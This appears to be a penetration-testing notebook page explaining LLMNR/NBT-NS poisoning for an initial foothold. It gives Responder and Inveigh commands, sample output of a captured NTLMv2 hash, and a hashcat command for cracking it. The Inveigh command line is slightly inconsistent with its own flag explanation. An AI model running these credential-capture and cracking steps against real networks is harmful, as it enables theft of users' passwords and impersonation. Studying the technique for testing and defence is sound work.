# Initial Foothold

## LLMNR/NBT-NS Poisoning

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

## Attack Path

* **Initial Connection Request:**\
  The victim host attempts to connect to a resource on the network by typing `\\dollarboy`.
* **DNS Failure:**\
  The primary server responds to the victim saying that the requested host (`\\dollarboy`) is unknown because there is no matching DNS record for it.
* **LLMNR Broadcast Request:**\
  Since DNS failed, the victim’s machine sends a multicast/LLMNR broadcast across the local network asking, "Does anyone know `\\dollarboy`?"
* **Attacker Responds:**\
  The attacker, running **Responder** on a Kali machine, listens for such broadcasts and responds, pretending to be `\\dollarboy`. The attacker tricks the victim into believing it has found the right destination.
* **Authentication Request Sent:**\
  The victim, trusting the attacker’s response, tries to authenticate with `\\dollarboy` by sending its **NTLMv2** credentials (username and password hash) to the attacker.
* **Hash Captured and Exploited:**\
  The attacker now has access to the NTLMv2 hash, which can either be:
  * **Cracked offline** to retrieve the plaintext password.
  * **Used in an SMB Relay attack** to impersonate the user on other systems (if SMB signing is not enforced).

## LLMNR/NBT-NS Poisoning from Linux

* `sudo responder -I {interface}`&#x20;

```
[+] [LLMNR]  Poisoned answer sent to 192.168.1.10 for name DOLLARBOY
[+] [SMB] NTLMv2-SSP Hash captured from 192.168.1.10
[SMB] User: DOMAIN\victim_user
[SMB] NTLMv2 Hash: 
    [+] [LLMNR]  Poisoned answer sent to 192.168.1.10 for name DOLLARBOY
[+] [SMB] NTLMv2-SSP Hash captured from 192.168.1.10
[SMB] User: DOMAIN\victim_user
[SMB] NTLMv2 Hash: 
    victim_user::DOMAIN:1122334455667788:ABCDEF1234567890:010100000000000000E04BDEB8C83F18C351...B8C83F18C351...
```

Then save the hash in .txt file\
`victim_user::DOMAIN:1122334455667788:ABCDEF1234567890:010100000000000000E04BD..................`

* Then run hashcat to crack the hash\
  `hashcat -m 5600 hash.txt /path/to/wordlist.txt`

## LLMNR/NBT-NS Poisoning from Windows

For windows, we can use Inveigh [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

* `PS C:\dollarboy> Import-Module .\Inveigh.ps1`-> Import Inveigh module
* `PS C:\dollarboy> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y`\
  **Explanation:**\
  `-LLMNR Y`: Enable LLMNR poisoning.\
  `-NBNS Y`: Enable NBNS poisoning.\
  `-ConsoleOutput Y`: Display captured hashes in the PowerShell console.\
  additionally we can use `-FileOutput Y` to save into file

Once the NTLMv2 Hash is captured, crack with hashcat.

\+ We can use executable (C#) version of Inveigh. C# version is constantly updated.<br>
